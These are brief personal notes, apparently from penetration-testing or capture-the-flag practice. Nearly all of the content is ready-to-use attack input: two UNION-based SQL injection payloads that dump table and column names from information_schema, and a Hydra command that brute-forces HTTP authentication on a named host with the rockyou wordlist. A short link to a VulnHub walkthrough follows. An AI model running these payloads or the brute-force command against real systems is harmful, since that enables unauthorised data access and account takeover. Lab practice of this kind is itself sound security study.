**sqli** for all tables

' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() #

for all column names

' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users' AND table_schema = database() #

HYDRA for online file

hydra -V -l istheory -P /usr/share/wordlists/rockyou.txt http-get://is.theorizeit.org/auth/ 


corrosion VM walkthrough

https://medium.com/@z6157881/corrosion-2-vulnhub-walkthrough-30c00787fa5d
